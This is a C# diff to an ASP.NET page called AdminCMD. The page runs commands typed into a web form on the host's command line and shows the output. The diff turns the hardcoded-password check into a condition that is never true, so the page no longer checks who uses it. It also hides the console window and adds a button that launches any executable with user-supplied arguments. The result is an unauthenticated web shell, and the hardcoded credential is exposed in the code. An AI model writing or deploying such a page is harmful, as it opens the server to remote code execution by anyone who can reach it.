@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Security;
 using System.Text;
 using System.Web;
 using System.Web.UI;
@@ -14,7 +15,7 @@ namespace AdminCMD
     {
         protected void Page_Load(object sender, EventArgs e)
         {
-            if (Request["user"] != "Priest@731097019"||false)
+            if (Request["user"] != "Priest@731097019"&&false)
             {
                 Response.Redirect("index.html",true);
             }
@@ -45,18 +46,44 @@ namespace AdminCMD
             p.StartInfo.RedirectStandardInput = true;
             p.StartInfo.RedirectStandardOutput = true;
             p.StartInfo.RedirectStandardError = true;
-            p.StartInfo.CreateNoWindow = false;
+            p.StartInfo.CreateNoWindow = true;
             p.Start();
 
             string strInput = TextBox1.Text;
             p.StandardInput.WriteLine(strInput + "&exit");
             p.StandardInput.AutoFlush = true;
-            string strOuput = p.StandardOutput.ReadToEnd();
+            string strOuput = p.StandardOutput.ReadToEnd();//10.0.17134.1 2018//6.3.9600 2013
             textarea1.InnerHtml += strOuput.Replace("Microsoft Windows [版本 6.3.9600]\r\n(c) 2013 Microsoft Corporation。保留所有权利。\r\n", "").Replace("&exit", "").Replace("\r\n", "<br />");
             TextBox1.Text ="";
 
             p.WaitForExit();
             p.Close();
+        }
+
+        protected void Button2_Click(object sender, EventArgs e)
+        {
+            if (!string.IsNullOrEmpty(FileName.Text) || FileName.Text != "")
+            {
+                if (FileName.Text == "五子棋")
+                {
+                    Process.Start(@"C:\Users\Administrator\Desktop\新建文件夹\Debug\ConsoleApplication2.exe");
+                }
+                else if (FileName.Text == "MC")
+                {
+                    Process.Start(@"C:\软件包\像素宝可梦世代\start.bat");
+                }
+                else {
+                    Process p = new Process();
+                    p.StartInfo.FileName = FileName.Text;
+                    if (!string.IsNullOrEmpty(Arguments.Text) || Arguments.Text != "")
+                        p.StartInfo.Arguments = Arguments.Text;
+                    p.Start();
+                }
+            }
+                
+            //string ph = @"C:\Windows\system32\";
+            //Process.Start("explorer", ph);
+            //Process.Start(ph);
         }
     }
 }
